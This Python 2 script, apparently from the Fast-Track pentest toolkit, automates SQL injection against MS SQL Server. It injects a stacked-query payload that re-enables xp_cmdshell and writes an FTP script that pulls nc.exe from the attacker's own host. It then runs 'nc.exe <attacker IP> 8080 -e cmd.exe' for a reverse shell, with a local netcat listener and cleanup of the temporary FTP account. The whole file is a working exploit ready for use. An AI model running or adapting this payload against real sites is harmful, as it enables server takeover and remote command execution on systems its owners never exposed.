#!/usr/bin/env python

import pexpect
import os
import time
import sys
import subprocess

definepath=os.getcwd()
sys.path.append("%s/bin/ftsrc/" % (definepath))
import include

try:
   import psyco
   psyco.full()
except ImportError:
   pass
try:
   targeturl=sys.argv[4]
except IndexError:
   include.print_banner()
   print """

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Requirements: PExpect, ProFTP
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    SQL Injector FTP 

    This menu will automatically set up an FTP server for you, create a user account,
    place netcat in the home directory, do SQL injection, reverse ftp netcat off of the
    system, shut down FTP, delete the user account just created, and give you a reverse
    shell on the affected system.
             """

   sqlquestion1=raw_input("""
    Enter the URL of the susceptible site, remember to put 'INJECTHERE for the injectible parameter

    Example: http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
    
    <ctrl>-c to exit to Main Menu...    

    Enter here: """)
createdir=subprocess.Popen("mkdir /home/ftpshare", shell=True).wait()
adduser=subprocess.Popen("useradd ftpuser -d /home/ftpshare -s /bin/false", shell=True).wait()
time.sleep(1)
ncopy=subprocess.Popen("cp /pentest/windows-binaries/tools/nc.exe /home/ftpshare/", shell=True).wait()
permissions=subprocess.Popen("chmod 755 /home/ftpshare", shell=True).wait()
try:
   child1=pexpect.spawn('passwd ftpuser')
   child1.sendline('ftpuser')
   child1.expect('Retype*')
   child1.sendline('ftpuser')
   child1.interact()
except Exception:
       print '    Enabled FTPUser Account...'
print '    Created user FTPUser and made home directory of /home/ftpshare'
import socket
try:
   ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   ipaddr.connect(('google.com', 0))
   ipaddr.settimeout(2)
   ipaddr=ipaddr.getsockname()[0]
except Exception:
   print "    No internet connection detected, please enter your IP address manually.."
   ipaddr=raw_input("Enter your IP Address: ")
string1=(r"""';exec master..sp_addextendedproc "xp_cmdshell", "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll";exec master..sp_configure "show advanced options", 1;RECONFIGURE;exec master..sp_configure "xp_cmdshell", 1;RECONFIGURE;exec master..xp_cmdshell 'echo open %s> moo.txt';exec master..xp_cmdshell 'echo failedlogin1>> moo.txt' ;exec master..xp_cmdshell 'echo failedlogin2>> moo.txt';exec master..xp_cmdshell 'echo user>> moo.txt';exec master..xp_cmdshell 'echo ftpuser>> moo.txt';exec master..xp_cmdshell 'echo ftpuser>> moo.txt';exec master..xp_cmdshell 'echo bin>> moo.txt';exec master..xp_cmdshell 'echo get nc.exe>> moo.txt';exec master..xp_cmdshell 'echo bye>> moo.txt';exec master..xp_cmdshell 'ftp -s:moo.txt';exec master..xp_cmdshell 'del moo.txt';exec master..xp_cmdshell 'nc.exe %s 8080 -e cmd.exe'--""" % (ipaddr,ipaddr))
sqlreplace = targeturl.replace("'INJECTHERE", """%s""" % (string1))
try:
   import urllib
   print '    Starting FTP Service...'
   ftpstart=subprocess.Popen("proftpd &", shell=True).wait()
   time.sleep(3)
   print '    FTP Service started...'
   print '    Starting NetCat, a window should pop-up'
   ncstart=pexpect.spawn('xterm -geometry 60x20 -bg black -fg green -fn *-fixed-*-*-*-20-* -T "Fast-Track SQL Injector" -e nc -lvp 8080 2> /dev/null')
   print '    NetCat Started....'
   print "    Sending exploit...."
   time.sleep(3)
   connect=urllib.urlopen("""%s""" % (sqlreplace).replace(" ", "%20"))
   print "    You should have a shell if everything went good....Might take a couple seconds\n"
   print '    Sleeping 5 seconds then running cleanup'                  
   time.sleep(5)
   cleanup1=os.system('userdel ftpuser;rm -rf /home/ftpshare/;killall proftpd')
except Exception:
   print '    Something went wrong, did you enter the IP address right?? Do you have netcat and FTP running??\n\nAlso, might not be running as "SA".'
   time.sleep(5)       
cleanup1=subprocess.Popen("userdel ftpuser;rm -rf /home/ftpshare/;killall proftpd", shell=True).wait()
